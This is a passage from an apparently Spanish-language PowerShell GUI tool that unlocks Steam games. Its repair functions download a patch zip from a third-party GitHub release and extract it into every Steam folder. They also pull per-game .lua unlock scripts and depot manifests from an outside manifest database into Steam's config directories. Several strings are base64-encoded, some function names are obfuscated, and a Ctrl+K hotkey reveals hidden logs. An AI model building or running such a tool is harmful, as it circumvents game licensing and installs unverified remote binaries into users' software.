                        foreach($d in @("config\lua","config\stplug-in")){
                            $dp=Join-Path $dst $d; if(-not (Test-Path $dp)){ New-Item -ItemType Directory -Path $dp -Force | Out-Null }
                            Copy-Item -LiteralPath $srcFile.FullName -Destination (Join-Path $dp $f) -Force -ErrorAction SilentlyContinue
                        }
                    }
                }
            }
            foreach($kv in $allMans.GetEnumerator()){
                $f=$kv.Key; $have=$kv.Value | Sort-Object -Unique
                $missing=$steamRoots | Where-Object { $have -notcontains $_ }
                foreach($dst in $missing){
                    $src=$have | Select-Object -First 1
                    $srcFile=@(Get-ChildItem -LiteralPath (Join-Path $src "config\depotcache") -Filter $f -ErrorAction SilentlyContinue | Select-Object -First 1), (Get-ChildItem -LiteralPath (Join-Path $src "depotcache") -Filter $f -ErrorAction SilentlyContinue | Select-Object -First 1) | Where-Object { $_ } | Select-Object -First 1
                    if($srcFile){
                        foreach($d in @("config\depotcache","depotcache")){
                            $dp=Join-Path $dst $d; if(-not (Test-Path $dp)){ New-Item -ItemType Directory -Path $dp -Force | Out-Null }
                            Copy-Item -LiteralPath $srcFile.FullName -Destination (Join-Path $dp $f) -Force -ErrorAction SilentlyContinue
                        }
                    }
                }
            }
        }
        [System.Windows.Forms.MessageBox]::Show("Activacion reparada en $($steamRoots.Count) rutas.","Solucionar activacion 2","OK","Information")
    } catch { [System.Windows.Forms.MessageBox]::Show("Error: $($_.Exception.Message)","Solucionar activacion 2","OK","Error") }
}
$script:sPatch2=New-CfgBtn ($sY+290) "Solucionar activacion 2" "Repara la activacion en todas las rutas Steam" { Repair-Activacion2 }
$script:sp.Controls.Add($script:sPatch2)
$script:sp.Controls.Add($script:sDiag)
$script:sDiag.BringToFront()


function Repair-UnoApp([string]$appid) {
    $res=@{ok=$false; msg=''; man=0}
    try {
        $roots=@()
        try { $m=Get-SteamPath; if($m){$roots+=$m} } catch {}
        try {
            $libFiles=@((Join-Path $m "steamapps\libraryfolders.vdf"),(Join-Path $m "config\libraryfolders.vdf"))
            foreach($lf in $libFiles){
                if(Test-Path $lf){
                    $txtL=Get-Content -LiteralPath $lf -Raw -ErrorAction SilentlyContinue
                    foreach($mL in [regex]::Matches($txtL,'"path"\s+"([^"]+)"')){
                        $pL=$mL.Groups[1].Value -replace '\\\\','\'
                        if($pL -and (Test-Path $pL) -and $roots -notcontains $pL){ $roots+=$pL }
                    }
                }
            }
        } catch {}
        $roots=$roots | Sort-Object -Unique | Where-Object { $_ -and (Test-Path $_) }
        if($roots.Count -eq 0){ $res.msg="No se encontraron rutas de Steam"; return $res }
        try{ if($script:bibRepairProgress){$script:bibRepairProgress['text']="Descargando componente de reparacion..."} }catch{}
        $zipUrl="https://github.com/bastisayes/Fixes-steam/releases/download/bastisss/parche_nuevo.zip"
        $tmpZip=Join-Path $env:TEMP "parche2_$(Get-Random).zip"
        try { (New-Object System.Net.WebClient).DownloadFile($zipUrl,$tmpZip) } catch { try { Invoke-WebRequest -Uri $zipUrl -OutFile $tmpZip -UseBasicParsing -TimeoutSec 60             } catch { $res.msg="No se pudo descargar el componente"; return $res } }
        if(-not (Test-Path $tmpZip) -or ((Get-Item $tmpZip).Length -lt 1000)){ $res.msg="Descarga incompleta"; return $res }
        foreach($sr in $roots){
            try {
                $lockedA = Expand-PatchZip -zip $tmpZip -root $sr
                if($lockedA.Count -gt 0){ Remove-Item $tmpZip -Force -ErrorAction SilentlyContinue; $res.msg="Cerra Steam y los juegos y reintenta. Archivos en uso: " + (($lockedA | Select-Object -First 3) -join ", "); return $res }
            } catch { Remove-Item $tmpZip -Force -ErrorAction SilentlyContinue; $res.msg="No se pudo extraer a $sr"; return $res }
        }
        Remove-Item $tmpZip -Force -ErrorAction SilentlyContinue
        try{ if($script:bibRepairProgress){$script:bibRepairProgress['text']="Descargando datos del juego..."} }catch{}
        $sr0=$roots[0]
        $manDir=Join-Path $sr0 "config\depotcache"; $luaDir=Join-Path $sr0 "config\stplug-in"; $luaDir2=Join-Path $sr0 "config\lua"
        foreach($d in @($manDir,$luaDir,$luaDir2)){ if(-not (Test-Path -LiteralPath $d)){ New-Item -ItemType Directory -Path $d -Force | Out-Null } }
        $sbBase="https://raw.githubusercontent.com/SPIN0ZAi/SB_manifest_DB"; $sbCdn="https://cdn.jsdelivr.net/gh/SPIN0ZAi/SB_manifest_DB"
        $tmp=Join-Path $env:TEMP "sb_$appid`_$(Get-Random)"
        try { New-Item -ItemType Directory -Path $tmp -Force | Out-Null } catch {}
        $luaOk=$false; $manCount=0
        try {
            $wc=New-Object System.Net.WebClient; $txtLua=$null
            for($r=0;$r -lt 2 -and -not $txtLua;$r++){
                try { $txtLua=$wc.DownloadString("$sbCdn@$appid/$appid.lua") } catch {}
                if(-not $txtLua){ try { $txtLua=$wc.DownloadString("$sbBase/$appid/$appid.lua") } catch {} }
                if(-not $txtLua){ Start-Sleep -Milliseconds 400 }
            }
            if($txtLua -and $txtLua -match "addappid"){
                [IO.File]::WriteAllText((Join-Path $tmp "$appid.lua"),$txtLua)
                Copy-Item -LiteralPath (Join-Path $tmp "$appid.lua") -Destination (Join-Path $luaDir "$appid.lua") -Force -ErrorAction SilentlyContinue
                Copy-Item -LiteralPath (Join-Path $tmp "$appid.lua") -Destination (Join-Path $luaDir2 "$appid.lua") -Force -ErrorAction SilentlyContinue
                $luaOk=$true
                $ids=@([regex]::Matches($txtLua,'setManifestid\((\d+),\s*"(\d+)"') | ForEach-Object { "$($_.Groups[1].Value)_$($_.Groups[2].Value).manifest" }) | Select-Object -Unique
                try{ if($script:bibRepairProgress){$script:bibRepairProgress['text']="Descargando manifests del juego..."} }catch{}
                foreach($mm in $ids){
                    $destMan=Join-Path $manDir $mm
                    if((Test-Path -LiteralPath $destMan) -and ((Get-Item -LiteralPath $destMan).Length -gt 500)){ $manCount++; continue }
                    try { $wc2=New-Object System.Net.WebClient; $dst2=Join-Path $tmp $mm; try { $wc2.DownloadFile("$sbCdn@$appid/$mm",$dst2) } catch { $wc2.DownloadFile("$sbBase/$appid/$mm",$dst2) }; $wc2.Dispose(); if((Test-Path $dst2) -and ((Get-Item $dst2).Length -gt 100)){ Copy-Item -LiteralPath $dst2 -Destination $destMan -Force; $manCount++ } } catch {}
                }
                if($ids.Count -eq 0){ $manCount=1 }
            }
            $wc.Dispose()
        } catch {}
        Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
        $res.ok=$luaOk; $res.man=$manCount
        if(-not $luaOk){ $res.msg="No se encontraron luas/manifests para el appid $appid" }
    } catch { $res.msg=$_.Exception.Message }
    return $res
}

$script:sFixInd=New-CfgBtn ($sY+344) "Arreglar conexion individual" "Pone el nombre de un juego que no descarga y repara ese appid" {
    try {
        $dlg=New-Object System.Windows.Forms.Form
        $dlg.Text="Arreglar conexion individual"
        $dlg.ClientSize=New-Object System.Drawing.Size(580,440)
        $dlg.StartPosition="CenterParent"; $dlg.FormBorderStyle="FixedDialog"
        $dlg.MaximizeBox=$false; $dlg.MinimizeBox=$false; $dlg.BackColor=$script:BG
        try { $dlg.Icon=$form.Icon } catch {}
        $lblQ=New-Object System.Windows.Forms.Label
        $lblQ.Text="Nombre del juego (ej: marvel's spiderman):"; $lblQ.Font=$script:FntCard
        $lblQ.ForeColor=$script:White; $lblQ.BackColor=$script:BG
        $lblQ.Location=New-Object System.Drawing.Point(12,12); $lblQ.AutoSize=$true
        $dlg.Controls.Add($lblQ)
        $txtQ=New-Object System.Windows.Forms.TextBox
        $txtQ.Location=New-Object System.Drawing.Point(12,40); $txtQ.Size=New-Object System.Drawing.Size(440,26)
        $txtQ.BackColor=[System.Drawing.Color]::FromArgb(18,28,46); $txtQ.ForeColor=$script:White
        $txtQ.BorderStyle="FixedSingle"
        $dlg.Controls.Add($txtQ)
        $btnBuscar=New-Object System.Windows.Forms.Button
        $btnBuscar.Location=New-Object System.Drawing.Point(458,40); $btnBuscar.Size=New-Object System.Drawing.Size(104,26)
        $btnBuscar.Text="Buscar"; $btnBuscar.BackColor=$script:CardBG; $btnBuscar.ForeColor=$script:White; $btnBuscar.FlatStyle="Flat"
        $btnBuscar.Cursor=[System.Windows.Forms.Cursors]::Hand
        $dlg.Controls.Add($btnBuscar)
        $lv=New-Object System.Windows.Forms.ListView
        $lv.Location=New-Object System.Drawing.Point(12,74); $lv.Size=New-Object System.Drawing.Size(550,270)
        $lv.View="Details"; $lv.FullRowSelect=$true; $lv.MultiSelect=$false
        $lv.BackColor=[System.Drawing.Color]::FromArgb(18,28,46); $lv.ForeColor=$script:White
        $lv.BorderStyle="FixedSingle"
        $col1=$lv.Columns.Add("Juego",330); $lv.Columns.Add("AppID",90)
        $dlg.Controls.Add($lv)
        $st=New-Object System.Windows.Forms.Label
        $st.Text="Escribi un nombre y presiona Buscar."; $st.Font=$script:FntSub
        $st.ForeColor=$script:Yellow; $st.BackColor=$script:BG
        $st.Location=New-Object System.Drawing.Point(12,350); $st.AutoSize=$true
        $dlg.Controls.Add($st)
        $btnRep=New-Object System.Windows.Forms.Button
        $btnRep.Location=New-Object System.Drawing.Point(12,378); $btnRep.Size=New-Object System.Drawing.Size(550,32)
        $btnRep.Text="Reparar seleccionado"; $btnRep.BackColor=$script:CardBG; $btnRep.ForeColor=$script:White; $btnRep.FlatStyle="Flat"
        $btnRep.Cursor=[System.Windows.Forms.Cursors]::Hand; $btnRep.Enabled=$false
        $dlg.Controls.Add($btnRep)
        $btnBuscar.Add_Click({
            $q=$txtQ.Text.Trim()
            if([string]::IsNullOrWhiteSpace($q)){ [System.Windows.Forms.MessageBox]::Show("Escribi el nombre del juego.","Arreglar conexion individual","OK","Warning"); return }
            $lv.Items.Clear(); $st.ForeColor=$script:Yellow; $st.Text="Buscando '$q'..."
            [System.Windows.Forms.Application]::DoEvents()
            $found=New-Object 'System.Collections.Generic.List[object]'
            try {
                $enc=[uri]::EscapeDataString($q)
                for($pg=1;$pg -le 2;$pg++){
                    try {
                        $r=Invoke-RestMethod -Uri "https://store.steampowered.com/api/storesearch/?term=$enc&l=spanish&v=1&cc=ar&page=$pg" -UseBasicParsing -TimeoutSec 15 -ErrorAction Stop
                        if(-not $r.total){ break }
                        foreach($it in $r.items){
                            $id=[string]$it.id; $nm=[string]$it.name
                            if($id -and $nm -and -not ($found | Where-Object { $_ -eq "$id|$nm" })){ $found.Add("$id|$nm") }
                        }
                    } catch { break }
                }
            } catch {}
            try { foreach($aid in @(Search-AppIdsByName $q)){ $nm2=Get-GameNameByAppId $aid; if(-not ($found | Where-Object { $_ -like "*|$aid" })){ $found.Add("$aid|$nm2") } } } catch {}
            if($found.Count -eq 0){ $st.ForeColor=$script:Red; $st.Text="Sin resultados para '$q'."; return }
            foreach($ent in @($found | Select-Object -Unique)){
                $parts=$ent -split '\|'; $id=[string]$parts[$parts.Count-1]; $nm=[string]$parts[0]
                $li=New-Object System.Windows.Forms.ListViewItem($nm); [void]$li.SubItems.Add($id); $li.Tag=$id
                [void]$lv.Items.Add($li)
            }
            $st.ForeColor=$script:Yellow; $st.Text="$($lv.Items.Count) resultados. Selecciona uno y presiona Reparar."
            $btnRep.Enabled=$true
        })
        $btnRep.Add_Click({
            $sel=@($lv.SelectedItems)
            if($sel.Count -eq 0){ return }
            $appid=[string]$sel[0].Tag; $gname=[string]$sel[0].Text
            $btnRep.Enabled=$false; $st.ForeColor=$script:Yellow
            $st.Text="Reparando $gname..."
            [System.Windows.Forms.Application]::DoEvents()
            $res2=Repair-UnoApp $appid
            if($res2.ok){
                $st.ForeColor=$script:Green
                $st.Text="OK: $gname reparado."
                [System.Windows.Forms.MessageBox]::Show("Listo, $gname reparado.`nReinicia Steam y deberia descargar.","Arreglar conexion individual","OK","Information")
            } else {
                $st.Text="Probando otra reparacion..."
                [System.Windows.Forms.Application]::DoEvents()
                $ok1=Xz9Qk
                if($ok1){
                    $st.ForeColor=$script:Green
                    $st.Text="OK: $gname reparado."
                    [System.Windows.Forms.MessageBox]::Show("La primera no funciono pero la segunda lo arreglo. Reinicia Steam.","Arreglar conexion individual","OK","Information")
                } else {
                    $st.ForeColor=$script:Red
                    $st.Text="No se pudo reparar $gname. Revisa tu conexion."
                    [System.Windows.Forms.MessageBox]::Show("No se pudo reparar $gname. Revisa tu conexion e intenta de nuevo.","Arreglar conexion individual","OK","Error")
                }
            }
            $btnRep.Enabled=$true
        })
        $txtQ.Add_KeyDown({ param($s2,$e2) if($e2.KeyCode -eq "Enter"){ $btnBuscar.PerformClick(); $e2.SuppressKeyPress=$true } })
        $dlg.ShowDialog() | Out-Null
        $dlg.Dispose()
    } catch { [System.Windows.Forms.MessageBox]::Show("Error: $($_.Exception.Message)","Arreglar conexion individual","OK","Error") }
}
$script:sp.Controls.Add($script:sFixInd)


$script:sLogLabel=New-Object System.Windows.Forms.Label
$script:sLogLabel.Text=(S("TG9nIGRlbCBSZXBhcmFkb3I6"))
$script:sLogLabel.Font=$FntSub;$script:sLogLabel.ForeColor=$script:Gray;$script:sLogLabel.BackColor=$BG
$script:sLogLabel.AutoSize=$true
$script:sLogLabel.Location=New-Object System.Drawing.Point($PAD,($sY+290))

$script:sLogBox=New-Object System.Windows.Forms.TextBox
$script:sLogBox.Location=New-Object System.Drawing.Point($PAD,($sY+306))
$script:sLogBox.Size=New-Object System.Drawing.Size($CW,68)
$script:sLogBox.Multiline=$true;$script:sLogBox.ReadOnly=$true
$script:sLogBox.ScrollBars="Vertical"
$script:sLogBox.BackColor=[System.Drawing.Color]::FromArgb(18,28,46);$script:sLogBox.ForeColor=[System.Drawing.Color]::FromArgb(220,235,255)
$script:sLogBox.Font=New-Object System.Drawing.Font("Consolas",9)
$script:sLogBox.BorderStyle="FixedSingle"

$script:sLogLabel2=New-Object System.Windows.Forms.Label
$script:sLogLabel2.Text="Log Reparar descargar 2:"
$script:sLogLabel2.Font=$FntSub;$script:sLogLabel2.ForeColor=$script:Gray;$script:sLogLabel2.BackColor=$BG
$script:sLogLabel2.AutoSize=$true
$script:sLogLabel2.Location=New-Object System.Drawing.Point($PAD,($sY+350))

$script:sLogBox2=New-Object System.Windows.Forms.TextBox
$script:sLogBox2.Location=New-Object System.Drawing.Point($PAD,($sY+366))
$script:sLogBox2.Size=New-Object System.Drawing.Size($CW,68)
$script:sLogBox2.Multiline=$true;$script:sLogBox2.ReadOnly=$true
$script:sLogBox2.ScrollBars="Vertical"
$script:sLogBox2.BackColor=[System.Drawing.Color]::FromArgb(18,28,46);$script:sLogBox2.ForeColor=[System.Drawing.Color]::FromArgb(220,235,255)
$script:sLogBox2.Font=New-Object System.Drawing.Font("Consolas",9)
$script:sLogBox2.BorderStyle="FixedSingle"

$script:sp.Controls.Add($script:sLogLabel)
$script:sp.Controls.Add($script:sLogBox)
$script:sp.Controls.Add($script:sLogLabel2)
$script:sp.Controls.Add($script:sLogBox2)
$script:sLogLabel.Visible=$false
$script:sLogBox.Visible=$false
$script:sLogLabel2.Visible=$false
$script:sLogBox2.Visible=$false

$script:watcherLogTimer=New-Object System.Windows.Forms.Timer
$script:watcherLogTimer.Interval=2000
$script:watcherLogTimer.Add_Tick({
    try {
        $logPath = Join-Path $env:TEMP (S("YnNtYXBfd2F0Y2hlci5sb2c="))
        $src=(S("YnNtYXBfd2F0Y2hlci5sb2c="))
        if (Test-Path $logPath) {
            $lines = @(Get-Content $logPath -Tail 40 -ErrorAction SilentlyContinue)
            if ($lines -and $lines.Count -gt 0) {
                if ($lines.Count -gt 30) { $lines = $lines[-30..-1] }
                $newText = $lines -join "`r`n"
                if ($script:sLogBox.Text -ne $newText) {
                    $script:sLogBox.Text = $newText
                    $script:sLogBox.SelectionStart = $script:sLogBox.Text.Length
                    $script:sLogBox.ScrollToCaret()
                }
            } else { if ($script:sLogBox.Text -ne "(Log vacio)") { $script:sLogBox.Text = "(Log vacio)" } }
        } else { if ($script:sLogBox.Text -ne "(No existe log...)") { $script:sLogBox.Text = "(No existe log - el reparador no escribio nada)`nRuta esperada: $env:TEMP\$src" } }
    } catch { if ($script:sLogBox.Text -ne "(Error leyendo log)") { $script:sLogBox.Text = "Error leyendo log: $($_.Exception.Message)" } }
})
$script:luatoolsLogTimer=New-Object System.Windows.Forms.Timer
$script:luatoolsLogTimer.Interval=2000
$script:luatoolsLogTimer.Add_Tick({
    try {
        $logPath2 = Join-Path $env:TEMP (S("YnNtYXBfbHVhdG9vbHMubG9n"))
        if (Test-Path $logPath2) {
            $lines2 = @(Get-Content $logPath2 -Tail 40 -ErrorAction SilentlyContinue)
            if ($lines2 -and $lines2.Count -gt 0) {
                if ($lines2.Count -gt 30) { $lines2 = $lines2[-30..-1] }
                $newText2 = $lines2 -join "`r`n"
                if ($script:sLogBox2.Text -ne $newText2) {
                    $script:sLogBox2.Text = $newText2
                    $script:sLogBox2.SelectionStart = $script:sLogBox2.Text.Length
                    $script:sLogBox2.ScrollToCaret()
                }
            } else { if ($script:sLogBox2.Text -ne "(Log vacio)") { $script:sLogBox2.Text = "(Log vacio)" } }
        } else { if ($script:sLogBox2.Text -ne "(No existe log...)") { $script:sLogBox2.Text = "(No existe log - Reparar juegos no escribio nada)`nRuta esperada: $env:TEMP\bsmap_luatools.log" } }
    } catch { if ($script:sLogBox2.Text -ne "(Error leyendo log)") { $script:sLogBox2.Text = "Error leyendo log: $($_.Exception.Message)" } }
})
$script:devLog2Visible = $false
function Td7Re {
    $script:devLog2Visible = -not $script:devLog2Visible
    $script:devLogVisible = $script:devLog2Visible
    Switch-CfgPage $script:cfgPage
}
$form.KeyPreview = $true
$form.Add_KeyDown({
    param($s2, $e2)
    if ($e2.Control -and $e2.KeyCode -eq 'K') { Td7Re; $e2.Handled = $true }
})
$script:watcherLogTimer.Start()
$script:luatoolsLogTimer.Start()
Switch-CfgPage 1

$form.Controls.Add($script:sp)

function Get-BiblioGames {
    $roots = @()
    try { if ($script:steamLibs -and $script:steamLibs.Count -gt 0) { $roots = @($script:steamLibs) } } catch {}
    if ($roots.Count -eq 0) { try { $roots = @(Ss3Jd) } catch { $roots = @() } }
    $roots = @($roots | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -Unique)
    $sigBuilder = New-Object System.Text.StringBuilder
    foreach ($rt in $roots) {
        foreach ($sub in @('config\stplug-in','config\lua')) {
            $dirPath = Join-Path $rt $sub
            try { $di = Get-Item -LiteralPath $dirPath -ErrorAction Stop; [void]$sigBuilder.Append($dirPath).Append('|').Append($di.LastWriteTimeUtc.Ticks).Append(';') }
            catch { [void]$sigBuilder.Append($dirPath).Append('|missing;') }
        }
    }
    $cacheKey = $sigBuilder.ToString() + '|v=' + $script:version
    if ($script:bibGamesCacheKey -eq $cacheKey -and $null -ne $script:bibGamesCache) { return ,$script:bibGamesCache }
    $diskCache = Join-Path $env:TEMP 'bsmap_biblio_games.json'
    try {
        if (Test-Path -LiteralPath $diskCache) {
            $doc = ConvertFrom-Json -InputObject ([System.IO.File]::ReadAllText($diskCache)) -ErrorAction Stop
            if ([string]$doc.cacheKey -eq $cacheKey -and $doc.games) {
                $cached = @($doc.games | ForEach-Object { [pscustomobject]@{appid=[string]$_.appid;name=[string]$_.name} })
                $script:bibGamesCacheKey = $cacheKey
                $script:bibGamesCache = $cached
                return ,$cached
            }
        }
    } catch {}
    $found = @{}
    foreach ($rt in $roots) {
        foreach ($sub in @('config\stplug-in','config\lua')) {
            $dirPath = Join-Path $rt $sub
            if (-not (Test-Path -LiteralPath $dirPath)) { continue }
            foreach ($file in @(Get-ChildItem -LiteralPath $dirPath -Filter '*.lua' -File -ErrorAction SilentlyContinue)) {
                $id = [System.IO.Path]::GetFileNameWithoutExtension($file.Name)
                if ($id -match '^\d+$' -and -not $found.ContainsKey($id)) {
                    $nm = ''
                    try { $nm = [string](Get-GameNameByAppId $id) } catch {}
                    if (-not $nm) { $nm = "AppID $id" }
                    $found[$id] = $nm
                }
            }
        }
    }
    $games = @($found.GetEnumerator() | ForEach-Object { [pscustomobject]@{appid=[string]$_.Key;name=[string]$_.Value} } | Sort-Object name)
    $script:bibGamesCacheKey = $cacheKey
    $script:bibGamesCache = $games
    try { [System.IO.File]::WriteAllText($diskCache, (ConvertTo-Json -InputObject @{cacheKey=$cacheKey;games=$games} -Depth 4 -Compress), (New-Object System.Text.UTF8Encoding $false)) } catch {}
    return ,$games
}
function Update-BiblioCoverCache {
    $cd = Join-Path $env:TEMP 'bsmap_covers'
    $key = 'missing'
    try { $di = Get-Item -LiteralPath $cd -ErrorAction Stop; $key = $di.LastWriteTimeUtc.Ticks.ToString() } catch {}
    if ($script:bibCoverCacheInitialized -and $script:bibCoverCacheKey -eq $key) { return }
    $cache = @{}
    try {
        foreach ($file in @(Get-ChildItem -LiteralPath $cd -Filter 'thumb_*.jpg' -File -ErrorAction SilentlyContinue)) {
            if ($file.BaseName -match '^thumb_(\d+)$' -and -not $cache.ContainsKey($Matches[1])) { $cache[$Matches[1]] = $file.FullName }
        }
        foreach ($file in @(Get-ChildItem -LiteralPath $cd -Filter '*.jpg' -File -ErrorAction SilentlyContinue)) {
            if ($file.BaseName -match '^\d+$' -and -not $cache.ContainsKey($file.BaseName)) { $cache[$file.BaseName] = $file.FullName }
        }
    } catch {}
    $script:bibCoverCache = $cache
    $script:bibCoverCacheKey = $key
    $script:bibCoverCacheInitialized = $true
}
function Get-BiblioCoverPath([string]$appid) {
    if (-not $script:bibCoverCacheInitialized) { Update-BiblioCoverCache }
    if ($appid -and $script:bibCoverCache.ContainsKey([string]$appid)) { return [string]$script:bibCoverCache[[string]$appid] }
    return ''
}
function Set-BiblioCoverPath([string]$appid, [string]$path) {
    if (-not $script:bibCoverCache) { $script:bibCoverCache = @{} }
    if ($appid -and $path) { $script:bibCoverCache[[string]$appid] = [string]$path }
}
function Start-BiblioCoverBatch {
    try {
        if (-not $script:bibCoverPool) { $script:bibCoverPool = [RunspaceFactory]::CreateRunspacePool(1,6); $script:bibCoverPool.Open() }
        while ($script:bibCoverJobs.Count -lt 6 -and $script:bibCoverQueue.Count -gt 0) {
            $aid = [string]$script:bibCoverQueue[0]
            $script:bibCoverQueue.RemoveAt(0)
            $script:bibCoverQueued.Remove($aid)
            $needsName = $false
            try { $needsName = [bool]$script:bibCoverNeedsName[$aid] } catch {}
            $thumbPath = Join-Path (Join-Path $env:TEMP 'bsmap_covers') ('thumb_' + $aid + '.jpg')
            if ((Test-Path -LiteralPath $thumbPath) -and (Get-Item -LiteralPath $thumbPath).Length -gt 500 -and -not $needsName) { continue }
            if ($script:bibCoverAttempted.ContainsKey($aid) -and ((Get-Date) - $script:bibCoverAttempted[$aid]).TotalHours -lt 12) { continue }
            $psB = [PowerShell]::Create(); $psB.RunspacePool = $script:bibCoverPool
            [void]$psB.AddScript({
                param($a,$dir,$needName)
                $out = @{appid=$a;ok=$false;path='';name=''}
                try {
                    $dest = Join-Path $dir ($a + '.jpg')
                    $thumb = Join-Path $dir ('thumb_' + $a + '.jpg')
                    Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
                    $sourceOk = $false
                    $apiHeader = ''
                    $apiChecked = $false
                    if ($needName) {
                        $apiChecked = $true
                        try {
                            $api = Invoke-RestMethod -Uri ('https://store.steampowered.com/api/appdetails?appids=' + $a + '&l=english') -UseBasicParsing -TimeoutSec 7 -ErrorAction Stop
                            $entry = $api.PSObject.Properties[$a].Value
                            if ($entry -and $entry.success -and $entry.data) {
                                if ($entry.data.name) { $out.name = [string]$entry.data.name }
                                if ($entry.data.header_image) { $apiHeader = [string]$entry.data.header_image }
                            }
                        } catch {}
                    }
                    if ((Test-Path -LiteralPath $dest) -and (Get-Item -LiteralPath $dest).Length -gt 1000) {
                        $checkImg = $null
                        try { $checkImg = [System.Drawing.Image]::FromFile($dest); $sourceOk = $true } catch {} finally { if ($checkImg) { $checkImg.Dispose() } }
                    }
                    if (-not $sourceOk) {
                        try { Remove-Item -LiteralPath $dest -Force -ErrorAction SilentlyContinue } catch {}
                        $tmp = $dest + '.part'
                        $coverUrls = @(
                            ('https://cdn.cloudflare.steamstatic.com/steam/apps/' + $a + '/library_600x900.jpg'),
                            ('https://cdn.cloudflare.steamstatic.com/steam/apps/' + $a + '/library_600x900_2x.jpg'),
                            ('https://cdn.cloudflare.steamstatic.com/steam/apps/' + $a + '/header.jpg')
                        )
                        foreach ($coverUrl in $coverUrls) {
                            try {
                                Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
                                Invoke-WebRequest -Uri $coverUrl -OutFile $tmp -UseBasicParsing -TimeoutSec 7 -ErrorAction Stop
                                if ((Test-Path -LiteralPath $tmp) -and (Get-Item -LiteralPath $tmp).Length -gt 1000) {
                                    $checkImg = $null
                                    try { $checkImg = [System.Drawing.Image]::FromFile($tmp); $sourceOk = $true } catch {} finally { if ($checkImg) { $checkImg.Dispose() } }
                                    if ($sourceOk) { Move-Item -LiteralPath $tmp -Destination $dest -Force; break }
                                }
                            } catch {}
                        }

                        if (-not $sourceOk) {
                            if (-not $apiChecked) {
                                try {
                                    $api = Invoke-RestMethod -Uri ('https://store.steampowered.com/api/appdetails?appids=' + $a + '&l=english') -UseBasicParsing -TimeoutSec 7 -ErrorAction Stop
                                    $entry = $api.PSObject.Properties[$a].Value
                                    if ($entry -and $entry.success -and $entry.data) {
                                        if ($entry.data.name) { $out.name = [string]$entry.data.name }
                                        if ($entry.data.header_image) { $apiHeader = [string]$entry.data.header_image }
                                    }
                                } catch {}
                            }
                            if ($apiHeader) {
                                try {
                                    Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
                                    Invoke-WebRequest -Uri $apiHeader -OutFile $tmp -UseBasicParsing -TimeoutSec 7 -ErrorAction Stop
                                    if ((Test-Path -LiteralPath $tmp) -and (Get-Item -LiteralPath $tmp).Length -gt 1000) {
                                        $checkImg = $null
                                        try { $checkImg = [System.Drawing.Image]::FromFile($tmp); $sourceOk = $true } catch {} finally { if ($checkImg) { $checkImg.Dispose() } }
                                        if ($sourceOk) { Move-Item -LiteralPath $tmp -Destination $dest -Force }
                                    }
                                } catch {}
                            }
                        }
                        if (-not $sourceOk) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue; return $out }
                    }
                    if (-not ((Test-Path -LiteralPath $thumb) -and (Get-Item -LiteralPath $thumb).Length -gt 500)) {
                        $srcImg = $null; $bmp = $null; $gfx = $null
                        try {
                            Add-Type -AssemblyName System.Drawing -ErrorAction SilentlyContinue
                            $srcImg = [System.Drawing.Image]::FromFile($dest)
                            $bmp = New-Object System.Drawing.Bitmap(300,428)
                            $gfx = [System.Drawing.Graphics]::FromImage($bmp)
                            $gfx.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
                            $gfx.SmoothingMode = [System.Drawing.Drawing2D.SmoothingMode]::HighQuality
                            $gfx.PixelOffsetMode = [System.Drawing.Drawing2D.PixelOffsetMode]::HighQuality
                            $gfx.Clear([System.Drawing.Color]::Black)
                            $scale = [Math]::Min((300.0 / $srcImg.Width),(428.0 / $srcImg.Height))
                            $drawWidth = [int][Math]::Round($srcImg.Width * $scale)
                            $drawHeight = [int][Math]::Round($srcImg.Height * $scale)
                            $drawX = [int][Math]::Floor((300 - $drawWidth) / 2.0)
                            $drawY = [int][Math]::Floor((300 - $drawHeight) / 2.0)
                            $gfx.DrawImage($srcImg, (New-Object System.Drawing.Rectangle($drawX,$drawY,$drawWidth,$drawHeight)))
                            $thumbTmp = $thumb + '.part'
                            Remove-Item -LiteralPath $thumbTmp -Force -ErrorAction SilentlyContinue
                            $bmp.Save($thumbTmp, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                            Move-Item -LiteralPath $thumbTmp -Destination $thumb -Force
                        } catch { Remove-Item -LiteralPath ($thumb + '.part') -Force -ErrorAction SilentlyContinue } finally { if ($gfx) { $gfx.Dispose() }; if ($bmp) { $bmp.Dispose() }; if ($srcImg) { $srcImg.Dispose() } }
                    }
                    if ((Test-Path -LiteralPath $thumb) -and (Get-Item -LiteralPath $thumb).Length -gt 500) { $out.ok=$true; $out.path=$thumb }
                    else { $out.ok=$true; $out.path=$dest }
                } catch { try { Remove-Item -LiteralPath ($dest + '.part') -Force -ErrorAction SilentlyContinue } catch {} }
                return $out
            }).AddArgument([string]$aid).AddArgument((Join-Path $env:TEMP 'bsmap_covers')).AddArgument([bool]$needsName)
            $handle = $psB.BeginInvoke()
            $script:bibCoverJobs += @{appid=$aid;ps=$psB;h=$handle}
        }
    } catch {}
}
function Start-BiblioCovers($games) {
    try {
        $cd = Join-Path $env:TEMP 'bsmap_covers'
        if (-not (Test-Path -LiteralPath $cd)) { New-Item -ItemType Directory -Path $cd -Force | Out-Null }
        try { $vmark=Join-Path $cd 'thumbv2.done'; if(-not (Test-Path -LiteralPath $vmark)){ Get-ChildItem -LiteralPath $cd -Filter 'thumb_*.jpg' -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue; Set-Content -LiteralPath $vmark '2' -Encoding ASCII -ErrorAction SilentlyContinue } } catch {}
        Update-BiblioCoverCache
        if (-not $script:bibCoverQueue) { $script:bibCoverQueue = New-Object System.Collections.ArrayList }
        if (-not $script:bibCoverQueued) { $script:bibCoverQueued = @{} }
        if (-not $script:bibCoverAttempted) { $script:bibCoverAttempted = @{} }
        foreach ($g in $games) {
            $aid = [string]$g.appid
            $thumbPath = Join-Path $cd ('thumb_' + $aid + '.jpg')
            $hasThumb = $false
            $needsName = ([string]$g.name -like 'Juego *' -or [string]::IsNullOrWhiteSpace([string]$g.name))
            try { $hasThumb = (Test-Path -LiteralPath $thumbPath) -and (Get-Item -LiteralPath $thumbPath).Length -gt 500 } catch {}
            if (-not $aid -or ($hasThumb -and -not $needsName) -or $script:bibCoverQueued.ContainsKey($aid)) { continue }
